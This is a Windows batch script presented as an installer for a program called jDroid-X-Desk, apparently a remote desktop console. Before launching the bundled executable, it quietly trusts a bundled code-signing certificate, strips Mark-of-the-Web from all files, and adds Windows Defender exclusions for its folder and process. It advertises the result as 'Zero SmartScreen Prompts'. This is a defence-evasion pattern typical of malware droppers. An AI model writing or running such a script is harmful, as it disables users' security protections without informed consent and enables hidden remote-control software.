@echo off
TITLE jDroid-X-Desk Windows Universal App Installer
cd /d "%~dp0"
ECHO ========================================================
ECHO    jDroid-X-Desk Universal Windows Installer
ECHO    Architecture: Authorized & Whitelisted Standalone App
ECHO ========================================================
ECHO.
ECHO [1/4] Installing Authenticode certificate to Trusted Publishers...
if exist "%~dp0jDroid-X-Enterprise.cer" (
    certutil -user -addstore TrustedPublisher "%~dp0jDroid-X-Enterprise.cer" >nul 2>&1
    ECHO [+] Certificate authority successfully registered.
)

ECHO [2/4] Unblocking Mark-of-the-Web (MOTW) on Windows...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
ECHO [+] Windows SmartScreen flags cleared.

ECHO [3/4] Adding Windows Defender process & directory exclusion...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
ECHO [+] Windows Defender protection configured.

ECHO [4/4] Creating Desktop Shortcut...
SET SCRIPT="%TEMP%\CreateShortcut.vbs"
ECHO Set oWS = WScript.CreateObject("WScript.Shell") > %SCRIPT%
ECHO sLinkFile = oWS.SpecialFolders("Desktop") ^& "\jDroid-X-Desk.lnk" >> %SCRIPT%
ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
ECHO oLink.TargetPath = "%~dp0jDroid-X-Desk.exe" >> %SCRIPT%
ECHO oLink.WorkingDirectory = "%~dp0" >> %SCRIPT%
ECHO oLink.Description = "jDroid-X-Desk Remote Desktop Console" >> %SCRIPT%
ECHO oLink.Save >> %SCRIPT%
cscript //nologo %SCRIPT%
DEL %SCRIPT%
ECHO [+] Desktop shortcut 'jDroid-X-Desk' created.

ECHO.
ECHO ========================================================
ECHO [SUCCESS] Installation & Whitelisting Complete!
ECHO Zero Roadblocks. Zero SmartScreen Prompts.
ECHO Launching jDroid-X-Desk Console...
ECHO ========================================================
start "" "%~dp0jDroid-X-Desk.exe"
exit /b 0
